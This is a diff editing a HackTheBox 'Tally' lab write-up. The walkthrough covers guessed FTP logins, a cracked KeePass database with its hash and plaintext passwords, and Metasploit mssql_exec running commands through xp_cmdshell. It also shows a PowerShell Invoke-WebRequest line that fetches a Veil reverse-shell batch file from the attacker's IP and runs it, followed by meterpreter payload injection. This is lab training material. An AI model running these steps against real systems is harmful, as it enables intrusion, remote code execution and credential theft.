@@ -24,6 +24,7 @@ Checking the port 80 shows us that its a Sharepoint server.
 
 
 When in Thermopylae call a SPartan
+
 Resource: http://github.com/sensepost/SPartan
 
 
@@ -48,16 +49,13 @@ Please create your own user folder upon logging in
 
 Interesting
 
-Now we know the ftp password.
+Now we know the ftp password. We would just need to *guess* the ftp user. My general guesses as always are (root, ftpuser, ftp_user, ftp-user, ftp, user and afcourse anonymous logins) 
 
-We would just need to guess the ftp user
-
-My general guesses as always are (root, ftpuser, ftp_user, ftp-user, ftp, user and afcourse anonymous logins)
-
-You can call me a wordlist cause one of them worked!! :D
+You can call me a wordlist cause one of them worked!! :grinning:
 
 FTP Username: ftp_user
 FTP Password: UTDRSCH53c"$6hys
+
 ```
 ftp 10.10.10.59
 Name (10.10.10.59:root): ftp_user
@@ -74,11 +72,10 @@ ftp> ls
 226 Transfer complete.
 ```
 
-As we remember it was instructed that the person create his own folder when he logs in.
-
-So we go into Users and try searching for something nice
+As we remember it was instructed that the person create his own folder when he logs in.So we go into Users and try searching for something nice
 
 Under /User/Tim/Files we find something Nice !!
+
 ```
 ftp> ls
 200 PORT command successful.
@@ -91,6 +88,7 @@ ftp> ls
 Lets get brute forcing
 
 Create a hash using keepass2john
+
 ```
 root@kali:~/Hackthebox/Tally# keepass2john tim.kdbx 
 tim:$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da5f0f
@@ -104,6 +102,7 @@ $keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a3
 Keepass Password: simplementeyo
 
 After opening the kdbx with the new password we get some data which looks like this
+
 ```
 TALLY ACCT share : Finance : Acc0unting
 CISCO : cisco : cisco123
@@ -152,9 +151,7 @@ Launchint Metasploit!
 
 ```
 msf > use auxiliary/admin/mssql/mssql_exec
-msf auxiliary(mssql_exec) > set CMD cmd.exe /c type C:\\Users\\Sarah\\Desktop\\user.txt
-msf auxiliary(mssql_exec) > set PASSWORD GWE3V65#6KFH93@4GWTG2G 
-msf auxiliary(mssql_exec) > set RHOST 10.10.10.59
+...
 msf auxiliary(mssql_exec) > show options
 
 Module options (auxiliary/admin/mssql/mssql_exec):
@@ -170,13 +167,10 @@ Module options (auxiliary/admin/mssql/mssql_exec):
    USE_WINDOWS_AUTHENT  false                                            yes       Use windows authentification (requires DOMAIN option set)
 
 msf auxiliary(mssql_exec) > run
-[*] 10.10.10.59:1433 - The server may have xp_cmdshell disabled, trying to enable it...
-[*] 10.10.10.59:1433 - SQL Query: EXEC master..xp_cmdshell 'cmd.exe /c type C:\Users\Sarah\Desktop\user.txt'
- output
+
+output
  ------
  be72362e8dffeca2b42406d5d1c74bb1
-
-[*] Auxiliary module execution completed
 ```
 
 Now that we know that there is superb command execution on the machine, we can get a reverse shell
@@ -189,23 +183,6 @@ Veil-Evasion Incoming!!
 ===============================================================================
                                    Veil-Evasion
 ===============================================================================
-      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
-===============================================================================
-
-Veil-Evasion Menu
-
-	41 payloads loaded
-
-Available Commands:
-
-	back			Go to main Veil menu
-	checkvt			Check virustotal against generated hashes
-	clean			Remove generated artifacts
-	exit			Exit Veil
-	info			Information on a specific payload
-	list			List available payloads
-	use			Use a specific payload
-
 ```
 
 We do a listing of the exploits and we find a **powershell/meterpreter/rev_tcp.py** at 22
@@ -221,12 +198,6 @@ And hit generate
 ===============================================================================
                                    Veil-Evasion
 ===============================================================================
-      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
-===============================================================================
-
- [*] Language: powershell
- [*] Payload Module: powershell/meterpreter/rev_tcp
- [*] PowerShell doesn't compile, so you just get text :)
  [*] Source code written to: /var/lib/veil/output/source/Tally.bat
  [*] Metasploit RC file written to: /var/lib/veil/output/handlers/Tally.rc
 ```
@@ -265,10 +236,8 @@ Going back to our mssql_exec lets issue a command which will download the bat fi
 
 ```
 msf auxiliary(mssql_exec) > set CMD powershell.exe /c Invoke-WebRequest -Uri 10.10.14.186/Tally.bat -OutFile C:\\Users\\Sarah\\dotalol.bat
-CMD => powershell.exe /c Invoke-WebRequest -Uri 10.10.14.186/Tally.bat -OutFile C:\Users\Sarah\dotalol.bat
-msf auxiliary(mssql_exec) > run
 
-[*] 10.10.10.59:1433 - SQL Query: EXEC master..xp_cmdshell 'powershell.exe /c Invoke-WebRequest -Uri 10.10.14.186/Tally.bat -OutFile C:\Users\Sarah\dotalol.bat'
+msf auxiliary(mssql_exec) > run
 [*] Auxiliary module execution completed
 
 
@@ -283,10 +252,8 @@ Now we execute the batch file and wait for the reverse shell!
 
 ```
 msf auxiliary(mssql_exec) > set CMD cmd.exe /c C:\\Users\\Sarah\\dotalol.bat
-CMD => cmd.exe /c C:\Users\Sarah\dotalol.bat
-msf auxiliary(mssql_exec) > run
 
-[*] 10.10.10.59:1433 - SQL Query: EXEC master..xp_cmdshell 'cmd.exe /c C:\Users\Sarah\dotalol.bat'
+msf auxiliary(mssql_exec) > run
 [*] Auxiliary module execution completed
 
 
@@ -312,14 +279,7 @@ Upgrading our shell to x64 is not that diffucult when we have metasploit at our 
 meterpreter > background 
 [*] Backgrounding session 1...
 msf exploit(handler) > use windows/local/payload_inject
-msf exploit(payload_inject) > set payload windows/x64/meterpreter/reverse_tcp
-payload => windows/x64/meterpreter/reverse_tcp
-msf exploit(payload_inject) > set LHOST 10.10.14.186
-LHOST => 10.10.14.186
-msf exploit(payload_inject) > set LPORT 4443
-LPORT => 4443
-msf exploit(payload_inject) > set SESSION 1
-SESSION => 1
+...
 msf exploit(payload_inject) > show options
 
 Module options (exploit/windows/local/payload_inject):
@@ -364,6 +324,7 @@ Why do you spoil me Metasploit!!!! :astonished:
 We know that there is MSSQL service running on the machine
 
 MSSQL service + Windows Machine automatically rings the bell **Rotten Potato!**
+
 Resource: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075
 ```
 meterpreter > pwd
